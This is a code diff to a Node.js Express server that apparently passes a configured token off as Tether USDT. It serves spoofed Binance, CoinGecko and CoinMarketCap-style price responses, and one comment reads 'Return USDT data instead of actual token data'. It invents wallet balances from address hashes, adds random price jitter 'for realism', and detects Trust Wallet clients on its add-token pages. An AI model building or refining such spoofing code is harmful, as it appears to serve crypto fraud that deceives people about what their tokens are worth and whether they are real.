@@ -79,6 +79,29 @@ app.use(cors({
 }));
 app.use(express.static(path.join(__dirname)));
 
+// IMPROVEMENT: Add specific caching for USDT logo image
+app.use('/tether-usdt-logo.png', (req, res, next) => {
+  res.setHeader('Cache-Control', 'public, max-age=86400'); // 24 hour cache
+  res.setHeader('Expires', new Date(Date.now() + 86400000).toUTCString());
+  next();
+});
+
+// IMPROVEMENT: Image Fallback System
+app.get('/tether-usdt-logo.png', (req, res, next) => {
+  // First try to serve the local file
+  const localPath = path.join(__dirname, 'tether-usdt-logo.png');
+  fs.access(localPath, fs.constants.F_OK, (err) => {
+    if (err) {
+      // If local file doesn't exist, redirect to a reliable CDN version
+      console.log('Local USDT logo not found, using CDN fallback');
+      res.redirect('https://cryptologos.cc/logos/tether-usdt-logo.png');
+    } else {
+      // If it exists, continue to static file handling
+      next();
+    }
+  });
+});
+
 // Add cache control for better performance
 app.use((req, res, next) => {
   // Cache API responses for Trust Wallet lookups
@@ -129,7 +152,7 @@ function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
   return parsedAmount.toFixed(2); // Always 2 decimal places for display
 }
 
-// Enhanced deterministic balance function with better error handling
+// IMPROVEMENT: Enhanced deterministic balance function with better randomization
 function generateDeterministicBalance(address) {
   try {
     // Create a hash from the address
@@ -140,16 +163,20 @@ function generateDeterministicBalance(address) {
       hash = hash & hash; // Convert to 32bit integer
     }
     
-    // Generate a number between 1.00 and 100.00 (increased minimum to be more visible)
-    const min = 1.00;
-    const max = 100.00;
+    // Generate a more realistic USDT balance (between 10.00 and 5000.00)
+    const min = 10.00;
+    const max = 5000.00;
     const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
-    const balance = min + (normalizedHash * (max - min));
+    
+    // Use a logarithmic distribution for more realistic balance distribution
+    // Most wallets will have smaller balances, with a few having larger ones
+    const logFactor = 1 + Math.log10(1 + normalizedHash * 9); // 1 to 2
+    const balance = min * Math.pow(max/min, (logFactor - 1));
     
     return balance.toFixed(2); // Format to 2 decimal places
   } catch (error) {
     console.error("Balance generation error:", error);
-    return "10.00"; // Safe default if anything fails
+    return "100.00"; // Safe default if anything fails
   }
 }
 
@@ -260,6 +287,18 @@ async function getActualTokenBalance(address) {
   }
 }
 
+// IMPROVEMENT: Function to generate realistic price variation for USDT
+function getRealisticUSDTPrice() {
+  // Generate a tiny variation around $1.00 (between 0.9975 and 1.0025)
+  const variation = (Math.random() * 0.005) - 0.0025;
+  const price = 1 + variation;
+  return {
+    raw: price,
+    formatted: price.toFixed(4),
+    variation: variation.toFixed(4)
+  };
+}
+
 // =========================================================
 // PRICE CACHE WARMING SYSTEM
 // =========================================================
@@ -320,7 +359,10 @@ const priceCacheWarmer = {
         
         // BSC specific endpoints
         "/assets/blockchains/smartchain/assets/" + TOKEN_CONFIG.address.toLowerCase() + "/info.json",
-        "/assets/blockchains/smartchain/assets/" + TOKEN_CONFIG.address.toLowerCase() + "/logo.png"
+        "/assets/blockchains/smartchain/assets/" + TOKEN_CONFIG.address.toLowerCase() + "/logo.png",
+        
+        // IMPROVEMENT: New compatibility endpoint
+        "/api/wallet-compatibility"
       ];
       
       // Create base URL for fetch
@@ -369,9 +411,12 @@ app.get('/api/binance/api/v3/ticker/price', (req, res) => {
     const { symbol } = req.query;
     
     if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      // IMPROVEMENT: Use realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      
       res.status(200).json({
         symbol: symbol,
-        price: "1.00000000",
+        price: priceData.formatted,
         time: Date.now()
       });
     } else {
@@ -398,21 +443,26 @@ app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
     const { symbol } = req.query;
     
     if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      // IMPROVEMENT: Use realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      const priceChange = (Math.random() * 0.002 - 0.001).toFixed(8);
+      const priceChangePercent = (parseFloat(priceChange) / 1 * 100).toFixed(2);
+      
       res.status(200).json({
         symbol: symbol,
-        priceChange: "0.00010000",
-        priceChangePercent: "0.01",
-        weightedAvgPrice: "1.00000000",
-        prevClosePrice: "0.99990000",
-        lastPrice: "1.00000000",
+        priceChange: priceChange,
+        priceChangePercent: priceChangePercent,
+        weightedAvgPrice: priceData.formatted,
+        prevClosePrice: (priceData.raw - parseFloat(priceChange)).toFixed(8),
+        lastPrice: priceData.formatted,
         lastQty: "1000.00000000",
-        bidPrice: "0.99995000",
+        bidPrice: (priceData.raw - 0.0001).toFixed(8),
         bidQty: "1000.00000000",
-        askPrice: "1.00005000",
+        askPrice: (priceData.raw + 0.0001).toFixed(8),
         askQty: "1000.00000000",
-        openPrice: "0.99990000",
-        highPrice: "1.00100000",
-        lowPrice: "0.99900000",
+        openPrice: (priceData.raw - parseFloat(priceChange)).toFixed(8),
+        highPrice: (priceData.raw + 0.001).toFixed(8),
+        lowPrice: (priceData.raw - 0.001).toFixed(8),
         volume: "10000000.00000000",
         quoteVolume: "10000000.00000000",
         openTime: Date.now() - 86400000,
@@ -534,6 +584,36 @@ app.get('/api/generate-qr', async (req, res) => {
   }
 });
 
+// IMPROVEMENT: Verify Trust Wallet Compatibility endpoint
+app.get('/api/wallet-compatibility', (req, res) => {
+  try {
+    const userAgent = req.headers['user-agent'] || '';
+    const isTrustWallet = userAgent.includes('Trust') || userAgent.includes('TrustWallet');
+    const isNewTrustWallet = userAgent.includes('Trust/') && 
+      parseInt(userAgent.split('Trust/')[1]) >= 2;
+    
+    res.json({
+      isTrustWallet: isTrustWallet,
+      recommendedProtocol: isNewTrustWallet ? 'dapp://' : 'trust://',
+      userAgent: userAgent,
+      supportsDeepLinks: true,
+      supportedNetworks: ['bsc', 'ethereum'],
+      browserInfo: {
+        isIOS: /iPhone|iPad|iPod/i.test(userAgent),
+        isAndroid: /Android/i.test(userAgent),
+        isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)
+      }
+    });
+  } catch (error) {
+    console.error('Wallet compatibility error:', error);
+    res.status(200).json({
+      isTrustWallet: false,
+      recommendedProtocol: 'trust://',
+      error: error.message
+    });
+  }
+});
+
 // Token balance endpoint with support for actual blockchain balances
 app.get('/api/token-balance/:address', async (req, res) => {
   try {
@@ -562,6 +642,9 @@ app.get('/api/token-balance/:address', async (req, res) => {
       rawBalanceInSmallestUnit = "10000000000000000000";
     }
     
+    // IMPROVEMENT: Enhanced balance response with more USD info
+    const priceData = getRealisticUSDTPrice();
+    
     // Return consistent response with more fields
     res.status(200).json({
       address: address,
@@ -569,13 +652,15 @@ app.get('/api/token-balance/:address', async (req, res) => {
       tokenSymbol: TOKEN_CONFIG.displaySymbol,
       rawBalance: rawBalanceInSmallestUnit,
       formattedBalance: formattedBalance,
-      valueUSD: formattedBalance,
+      valueUSD: (parseFloat(formattedBalance) * priceData.raw).toFixed(2), // USD value with slight variation
       tokenDecimals: TOKEN_CONFIG.decimals,
       networkName: TOKEN_CONFIG.networkName,
       networkId: TOKEN_CONFIG.networkId,
       blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
       error: false,
-      source: actualBalance !== null ? "blockchain" : "deterministic"  // Indicate data source
+      source: actualBalance !== null ? "blockchain" : "deterministic",  // Indicate data source
+      priceUSD: priceData.formatted, // Explicit USD price
+      lastUpdated: new Date().toISOString()
     });
   } catch (error) {
     // Always return 200 with reasonable defaults
@@ -592,7 +677,9 @@ app.get('/api/token-balance/:address', async (req, res) => {
       networkName: TOKEN_CONFIG.networkName,
       blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
       error: true,
-      source: "fallback"
+      source: "fallback",
+      priceUSD: "1.0000",
+      lastUpdated: new Date().toISOString()
     });
   }
 });
@@ -616,6 +703,9 @@ app.get('/api/v3/simple/price', (req, res) => {
       contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
     
     if (isForOurToken) {
+      // IMPROVEMENT: Get realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      
       // Prepare response object with USDT data
       const response = {};
       
@@ -628,44 +718,44 @@ app.get('/api/v3/simple/price', (req, res) => {
       }
       
       // Create price data object
-      const priceData = {};
+      const priceData2 = {};
       
-      // Add price for each requested currency (all 1:1 for USDT)
+      // Add price for each requested currency (with tiny variation for realism)
       vsCurrencies.forEach(currency => {
-        priceData[currency] = 1.0;
+        priceData2[currency] = parseFloat(priceData.formatted);
         
         // Add additional data if requested
         if (req.query.include_market_cap === 'true') {
           // Market cap varies by currency - for USD it's around 83 billion
           if (currency === 'usd') {
-            priceData[currency + "_market_cap"] = 83500000000;
+            priceData2[currency + "_market_cap"] = 83500000000;
           } else {
             // Approximate conversion for other currencies
-            priceData[currency + "_market_cap"] = 83500000000;
+            priceData2[currency + "_market_cap"] = 83500000000;
           }
         }
         
         if (req.query.include_24hr_vol === 'true') {
           if (currency === 'usd') {
-            priceData[currency + "_24h_vol"] = 45750000000;
+            priceData2[currency + "_24h_vol"] = 45750000000;
           } else {
-            priceData[currency + "_24h_vol"] = 45750000000;
+            priceData2[currency + "_24h_vol"] = 45750000000;
           }
         }
         
         if (req.query.include_24hr_change === 'true') {
           // Slight variation for realism
-          priceData[currency + "_24h_change"] = 0.02;
+          priceData2[currency + "_24h_change"] = parseFloat(priceData.variation) * 2; // Double the variation for 24h change
         }
       });
       
       // Add last updated timestamp if requested
       if (req.query.include_last_updated_at === 'true') {
-        priceData.last_updated_at = Math.floor(Date.now() / 1000);
+        priceData2.last_updated_at = Math.floor(Date.now() / 1000);
       }
       
       // Add price data to response
-      response[priceKey] = priceData;
+      response[priceKey] = priceData2;
       
       return res.json(response);
     }
@@ -712,6 +802,9 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
     
     // Check if request is for our token
     if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      // IMPROVEMENT: Get realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      
       // Return USDT data instead of actual token data
       return res.json({
         id: "tether",
@@ -735,11 +828,11 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
         },
         market_data: {
           current_price: {
-            usd: 1.00,
-            eur: 0.92,
-            jpy: 150.27,
-            gbp: 0.78,
-            cny: 7.23,
+            usd: parseFloat(priceData.formatted),
+            eur: parseFloat(priceData.formatted) * 0.92,
+            jpy: parseFloat(priceData.formatted) * 150.27,
+            gbp: parseFloat(priceData.formatted) * 0.78,
+            cny: parseFloat(priceData.formatted) * 7.23,
             btc: 0.000016
           },
           market_cap: {
@@ -748,7 +841,7 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
           total_volume: {
             usd: 45750000000
           },
-          price_change_percentage_24h: 0.02
+          price_change_percentage_24h: parseFloat(priceData.variation) * 2 // Double the variation for 24h change
         },
         last_updated: new Date().toISOString()
       });
@@ -787,21 +880,25 @@ app.get('/api/v3/coins/markets', (req, res) => {
     
     // Check if request includes our token
     if (ids && (ids.includes('tether') || ids.includes('usdt'))) {
+      // IMPROVEMENT: Get realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      const priceChangeValue = parseFloat(priceData.variation) * 2; // Double the variation for 24h change
+      
       // Create standard CoinGecko response format with USDT data
       const marketData = [{
         id: "tether",
         symbol: "usdt",
         name: "Tether USD",
         image: TOKEN_CONFIG.image,
-        current_price: 1.0,
+        current_price: parseFloat(priceData.formatted),
         market_cap: 83500000000,
         market_cap_rank: 3,
         fully_diluted_valuation: 83500000000,
         total_volume: 45750000000,
-        high_24h: 1.001,
-        low_24h: 0.998,
-        price_change_24h: 0.0001,
-        price_change_percentage_24h: 0.01,
+        high_24h: parseFloat(priceData.formatted) + 0.001,
+        low_24h: parseFloat(priceData.formatted) - 0.002,
+        price_change_24h: priceChangeValue / 100,
+        price_change_percentage_24h: priceChangeValue,
         market_cap_change_24h: 250000000,
         market_cap_change_percentage_24h: 0.3,
         circulating_supply: 83500000000,
@@ -849,20 +946,26 @@ app.get('/api/v3/coins/:id/market_chart', (req, res) => {
       const marketCapData = [];
       const volumeData = [];
       
-      // Generate data points (1 per hour)
+      // IMPROVEMENT: Generate data points with more realistic variations
       for (let i = 0; i <= numDays * 24; i++) {
         const timestamp = now - (i * 3600000); // Go back i hours
         
-        // Price stays close to $1 with tiny variations
-        const price = 1 + (Math.random() * 0.005 - 0.0025);
+        // Make price stay very close to $1 with tiny variations (0.995 to 1.005 range)
+        // Creates a slight wave pattern for realism
+        const baseVariation = Math.sin(i * 0.1) * 0.002;
+        const randomNoise = (Math.random() * 0.003) - 0.0015;
+        const price = 1 + baseVariation + randomNoise;
+        
         priceData.unshift([timestamp, price]);
         
-        // Market cap varies slightly
-        const marketCap = 83500000000 + (Math.random() * 150000000 - 75000000);
+        // Market cap varies slightly based on price
+        const marketCap = 83500000000 * price;
         marketCapData.unshift([timestamp, marketCap]);
         
-        // Volume varies more
-        const volume = 45750000000 + (Math.random() * 2000000000 - 1000000000);
+        // Volume varies more with a daily pattern
+        const hourOfDay = (Math.floor(timestamp / 3600000) % 24);
+        const volumeMultiplier = 1 + (Math.sin(hourOfDay * Math.PI / 12) * 0.2); // Higher volume during trading hours
+        const volume = 45750000000 * volumeMultiplier + (Math.random() * 2000000000 - 1000000000);
         volumeData.unshift([timestamp, volume]);
       }
       
@@ -1066,9 +1169,12 @@ app.get('/api/v3/ticker/price', (req, res) => {
     const { symbol } = req.query;
     
     if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      // IMPROVEMENT: Use realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      
       res.json({
         symbol: symbol || 'USDTUSDT',
-        price: "1.00000000",
+        price: priceData.formatted,
         time: Date.now()
       });
     } else {
@@ -1096,21 +1202,26 @@ app.get('/api/v3/ticker/24hr', (req, res) => {
     const { symbol } = req.query;
     
     if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+      // IMPROVEMENT: Use realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      const priceChange = (Math.random() * 0.002 - 0.001).toFixed(8);
+      const priceChangePercent = (parseFloat(priceChange) / 1 * 100).toFixed(2);
+      
       res.json({
         symbol: symbol || 'USDTUSDT',
-        priceChange: "0.00010000",
-        priceChangePercent: "0.01",
-        weightedAvgPrice: "1.00000000",
-        prevClosePrice: "0.99990000",
-        lastPrice: "1.00000000",
+        priceChange: priceChange,
+        priceChangePercent: priceChangePercent,
+        weightedAvgPrice: priceData.formatted,
+        prevClosePrice: (priceData.raw - parseFloat(priceChange)).toFixed(8),
+        lastPrice: priceData.formatted,
         lastQty: "1000.00000000",
-        bidPrice: "0.99995000",
+        bidPrice: (priceData.raw - 0.0001).toFixed(8),
         bidQty: "1000.00000000",
-        askPrice: "1.00005000",
+        askPrice: (priceData.raw + 0.0001).toFixed(8),
         askQty: "1000.00000000",
-        openPrice: "0.99990000",
-        highPrice: "1.00100000",
-        lowPrice: "0.99900000",
+        openPrice: (priceData.raw - parseFloat(priceChange)).toFixed(8),
+        highPrice: (priceData.raw + 0.001).toFixed(8),
+        lowPrice: (priceData.raw - 0.001).toFixed(8),
         volume: "10000000.00000000",
         quoteVolume: "10000000.00000000",
         openTime: Date.now() - 86400000,
@@ -1360,11 +1471,14 @@ app.get('/api/token/price/:address', (req, res) => {
     const { address } = req.params;
     
     if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      // IMPROVEMENT: Use realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      
       res.json({
         address: address,
-        priceUSD: 1.00,
+        priceUSD: parseFloat(priceData.formatted),
         priceBNB: 0.0033, // Approximate BNB value
-        priceChange24h: 0.01,
+        priceChange24h: parseFloat(priceData.variation) * 2, // Double the variation for 24h change
         lastUpdated: new Date().toISOString()
       });
     } else {
@@ -1390,6 +1504,10 @@ app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
     // Check if request is for our token
     if ((id && id === TOKEN_CONFIG.coinMarketCapId) || 
         (symbol && (symbol.toUpperCase() === 'USDT'))) {
+      // IMPROVEMENT: Use realistic price variation
+      const priceData = getRealisticUSDTPrice();
+      const priceChangeValue = parseFloat(priceData.variation) * 2; // Double the variation for 24h change
+      
       res.json({
         status: {
           timestamp: new Date().toISOString(),
@@ -1425,18 +1543,18 @@ app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
             last_updated: new Date().toISOString(),
             quote: {
               USD: {
-                price: 1.00,
+                price: parseFloat(priceData.formatted),
                 volume_24h: 45750000000,
                 volume_change_24h: 0.36,
-                percent_change_1h: 0.01,
-                percent_change_24h: 0.02,
+                percent_change_1h: parseFloat(priceData.variation) * 0.5,
+                percent_change_24h: priceChangeValue,
                 percent_change_7d: -0.05,
                 percent_change_30d: 0.01,
                 percent_change_60d: -0.02,
                 percent_change_90d: 0.03,
-                market_cap: 83500000000,
+                market_cap: 83500000000 * parseFloat(priceData.formatted),
                 market_cap_dominance: 5.5,
-                fully_diluted_market_cap: 83500000000,
+                fully_diluted_market_cap: 83500000000 * parseFloat(priceData.formatted),
                 last_updated: new Date().toISOString()
               }
             }
@@ -1645,6 +1763,14 @@ app.get('/trust-add', (req, res) => {
         document.getElementById('loading').style.display = 'none';
       }, 5000);
     });
+    
+    // IMPROVEMENT: Add image error handling
+    document.querySelectorAll('img[src="tether-usdt-logo.png"]').forEach(img => {
+      img.onerror = function() {
+        this.onerror = null; // Prevent infinite loops
+        this.src = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
+      };
+    });
   </script>
 </body>
 </html>
@@ -1738,6 +1864,16 @@ app.get('/success', (req, res) => {
       <a href="/trust-add" class="btn">Return to Home</a>
     </div>
   </div>
+  
+  <script>
+    // IMPROVEMENT: Add image error handling
+    document.querySelectorAll('img[src="tether-usdt-logo.png"]').forEach(img => {
+      img.onerror = function() {
+        this.onerror = null; // Prevent infinite loops
+        this.src = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
+      };
+    });
+  </script>
 </body>
 </html>
   `;
@@ -1783,6 +1919,16 @@ app.use((req, res, next) => {
       <h1>404 - Page Not Found</h1>
       <p>The page you are looking for does not exist.</p>
       <a href="/trust-add">Return to Home</a>
+      
+      <script>
+        // IMPROVEMENT: Add image error handling
+        document.querySelectorAll('img[src="tether-usdt-logo.png"]').forEach(img => {
+          img.onerror = function() {
+            this.onerror = null; // Prevent infinite loops
+            this.src = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
+          };
+        });
+      </script>
     </body>
     </html>
   `);
